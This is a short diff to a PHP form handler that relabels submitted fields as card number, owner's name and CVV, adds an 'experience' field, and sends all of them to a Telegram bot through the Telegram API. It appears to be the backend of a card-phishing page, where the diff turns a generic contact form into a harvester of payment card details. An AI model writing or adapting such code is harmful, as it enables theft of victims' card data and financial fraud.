@@ -11,23 +11,29 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         if (isset($_POST['number'])) {
           if (!empty($_POST['number'])){
-            $name = "Имя пославшего: " . strip_tags($_POST['number']) . "%0A";
+            $name = "Card number: " . strip_tags($_POST['number']) . "%0A";
           }
         }
 
         if (isset($_POST['nickname'])) {
           if (!empty($_POST['nickname'])){
-            $phone = "Телефон: " . "%2B" . strip_tags($_POST['nickname']) . "%0A";
+            $phone = "Owner's name: " . "%2B" . strip_tags($_POST['nickname']) . "%0A";
           }
         }
 
         if (isset($_POST['password'])) {
           if (!empty($_POST['password'])){
-            $theme = "Тема: " .strip_tags($_POST['password']);
+            $theme = "CVV: " .strip_tags($_POST['password']);
           }
         }
+
+        if (isset($_POST['experience'])) {
+           if (!empty($_POST['experience'])){
+                $experience = "Experience: " .strip_tags($_POST['experience']);
+                }
+            }
         // Формируем текст сообщения
-        $txt = $name . $phone . $theme;
+        $txt = $name . $phone . $theme . $experience;
 
         $sendTextToTelegram = file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}");
         if ($output && $sendTextToTelegram) {
